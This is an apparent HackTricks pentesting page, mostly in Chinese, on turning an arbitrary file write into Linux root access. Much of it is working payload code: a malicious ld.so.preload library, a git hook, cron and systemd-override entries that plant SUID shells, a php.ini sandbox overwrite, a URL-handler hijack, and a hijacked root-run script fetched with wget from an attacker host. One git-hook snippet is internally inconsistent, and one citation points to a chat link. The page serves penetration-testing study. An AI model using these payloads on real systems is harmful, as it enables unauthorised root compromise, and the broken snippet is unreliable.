# 任意文件写入 root

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

该文件的行为类似 **`LD_PRELOAD`** 环境变量，但它也对 **SUID binaries** 生效。\
如果你能创建或修改它，可以添加一个**将在每次执行二进制时被加载的库的路径**。

For example: `echo "/tmp/pe.so" > /etc/ld.so.preload`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
### Git hooks

[**Git hooks**](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks) 是 **脚本**，会在 git 仓库 中的各种 **事件**（例如创建 commit、merge 等）发生时 **运行**。因此，如果某个 **有特权的脚本或用户** 频繁执行这些操作，并且可以 **写入 `.git` 文件夹**，这可以被用来 **privesc**。

For example, It's possible to **generate a script** in a git repo in **`.git/hooks`** so it's always executed when a new commit is created:
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/b' > pre-commit
chmod +x pre-commit
```
### Cron & 时间文件

如果你能**写入由 root 执行的与 cron 相关的文件**，通常可以在作业下次运行时获得代码执行。值得关注的目标包括：

- `/etc/crontab`
- `/etc/cron.d/*`
- `/etc/cron.hourly/*`, `/etc/cron.daily/*`, `/etc/cron.weekly/*`, `/etc/cron.monthly/*`
- Root's own crontab in `/var/spool/cron/` or `/var/spool/cron/crontabs/`
- `systemd` timers and the services they trigger

快速检查：
```bash
ls -la /etc/crontab /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly 2>/dev/null
find /var/spool/cron* -maxdepth 2 -type f -ls 2>/dev/null
systemctl list-timers --all 2>/dev/null
grep -R "run-parts\\|cron" /etc/crontab /etc/cron.* /etc/cron.d 2>/dev/null
```
典型滥用路径：

- **Append a new root cron job** 到 `/etc/crontab` 或 `/etc/cron.d/` 下的文件
- **Replace a script** 已被 `run-parts` 执行的 script
- **Backdoor an existing timer target**，通过修改其启动的 script 或 binary

最小的 cron payload 示例：
```bash
echo '* * * * * root cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash' >> /etc/crontab
```
如果你只能写入由 `run-parts` 使用的 cron 目录，请改为把一个可执行文件放在那里：
```bash
cat > /etc/cron.daily/backup <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown root:root /tmp/rootbash
chmod 4777 /tmp/rootbash
EOF
chmod +x /etc/cron.daily/backup
```
Notes:

- `run-parts` usually ignores filenames containing dots, so prefer names like `backup` instead of `backup.sh`.
- Some distros use `anacron` or `systemd` timers instead of classic cron, but the abuse idea is the same: **modify what root will execute later**.

### Service & Socket files

如果你可以写 **`systemd` unit files** 或被它们引用的文件，可能通过重新加载并重启该 unit，或等待 service/socket 激活路径触发，来以 root 身份执行代码。

有趣的目标包括：

- `/etc/systemd/system/*.service`
- `/etc/systemd/system/*.socket`
- Drop-in overrides in `/etc/systemd/system/<unit>.d/*.conf`
- Service scripts/binaries referenced by `ExecStart=`, `ExecStartPre=`, `ExecStartPost=`
- Writable `EnvironmentFile=` paths loaded by a root service

快速检查：
```bash
ls -la /etc/systemd/system /lib/systemd/system 2>/dev/null
systemctl list-units --type=service --all 2>/dev/null
systemctl list-units --type=socket --all 2>/dev/null
grep -R "^ExecStart=\\|^EnvironmentFile=\\|^ListenStream=" /etc/systemd/system /lib/systemd/system 2>/dev/null
```
常见滥用路径：

- **Overwrite `ExecStart=`** 在你可以修改的、由 root 拥有的 service unit 中
- **Add a drop-in override** 使用恶意的 `ExecStart=`，并先清除旧的
- **Backdoor the script/binary** 已被该 unit 引用的脚本/二进制
- **Hijack a socket-activated service** 通过修改对应的 `.service` 文件（当 socket 接收到连接时启动）

示例恶意 override:
```ini
[Service]
ExecStart=
ExecStart=/bin/sh -c 'cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash'
```
典型激活流程:
```bash
systemctl daemon-reload
systemctl restart vulnerable.service
# or trigger the socket-backed service by connecting to it
```
If you cannot restart services yourself but can edit a socket-activated unit, you may only need to **wait for a client connection** to trigger execution of the backdoored service as root.

### Overwrite a restrictive `php.ini` used by a privileged PHP sandbox

Some custom daemons validate user-supplied PHP by running `php` with a **restricted `php.ini`** (for example, `disable_functions=exec,system,...`). If the sandboxed code still has **any write primitive** (like `file_put_contents`) and you can reach the **exact `php.ini` path** used by the daemon, you can **overwrite that config** to lift restrictions and then submit a second payload that runs with elevated privileges.

Typical flow:

1. First payload overwrites the sandbox config.
2. Second payload executes code now that dangerous functions are re-enabled.

Minimal example (replace the path used by the daemon):
```php
<?php
file_put_contents('/path/to/sandbox/php.ini', "disable_functions=\n");
```
如果守护进程以 root 身份运行（或使用 root 所有的路径进行验证），第二次执行会产生 root 上下文。当沙箱运行时仍然可以写入文件时，这本质上是 **privilege escalation via config overwrite**。

### binfmt_misc

位于 `/proc/sys/fs/binfmt_misc` 的文件指示哪个二进制应该执行哪种类型的文件。TODO：检查滥用该机制以在常见文件类型被打开时执行 rev shell 的要求。

### Overwrite schema handlers (like http: or https:)

对受害者配置目录具有写权限的攻击者可以轻松替换或创建更改系统行为的文件，导致非预期的代码执行。通过修改 `$HOME/.config/mimeapps.list` 文件，使 HTTP 和 HTTPS URL 处理程序指向一个恶意文件（例如，设置 `x-scheme-handler/http=evil.desktop`），攻击者可以保证 **点击任何 http 或 https 链接都会触发该 `evil.desktop` 文件中指定的代码**。例如，将下面的恶意代码放入 `$HOME/.local/share/applications` 中的 `evil.desktop` 后，任何外部 URL 的点击都会运行其中嵌入的命令：
```bash
[Desktop Entry]
Exec=sh -c 'zenity --info --title="$(uname -n)" --text="$(id)"'
Type=Application
Name=Evil Desktop Entry
```
更多信息请查看 [**this post**](https://chatgpt.com/c/67fac01f-0214-8006-9db3-19c40e45ee49)，其中描述了它被用于利用一个真实漏洞。

### Root executing user-writable scripts/binaries

如果一个具有特权的工作流运行类似 `/bin/sh /home/username/.../script`（或任何位于非特权用户拥有的目录下的二进制文件），你可以劫持它：

- **Detect the execution:** 使用 [pspy](https://github.com/DominicBreuker/pspy) 监控进程，以捕获 root 调用用户可控路径：
```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```
- **Confirm writeability:** 确保目标文件及其目录都归你的 user 所有且可写。
- **Hijack the target:** 备份原始 binary/script 并放置一个会创建 SUID shell（或任何其他 root 操作）的 payload，然后恢复权限：
```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```
- **触发特权操作** (例如，按下会生成 helper 的 UI 按钮)。当 root 重新执行被劫持的路径时，使用 `./rootshell -p` 获取提权后的 shell。

## 参考资料

- [HTB Bamboo – hijacking a root-executed script in a user-writable PaperCut directory](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
- [HTB: Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)

{{#include ../../banners/hacktricks-training.md}}
